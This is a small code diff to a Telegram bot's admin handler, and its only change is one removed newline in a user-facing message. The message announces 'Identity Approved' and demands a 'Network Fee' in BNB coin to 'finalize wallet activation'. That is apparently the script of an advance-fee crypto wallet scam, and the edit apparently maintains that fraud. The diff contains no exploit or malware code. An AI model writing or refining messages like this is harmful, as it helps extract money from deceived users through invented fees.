@@ -255,7 +255,7 @@ async def admin_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text=(
         "Congratulations 🎉\n"
         "Identity Approved\n\n"
-        f"Network Fee:{PAYMENT_AMOUNT}\n\n"
+        f"Network Fee:{PAYMENT_AMOUNT}\n"
         "This fee is required to process the blockchain transaction and finalize wallet activation, enabling the Send, Receive, Buy, and Sell features.\n\n"
         "Payment Method:\n"
         "(BNB Coin)\n"
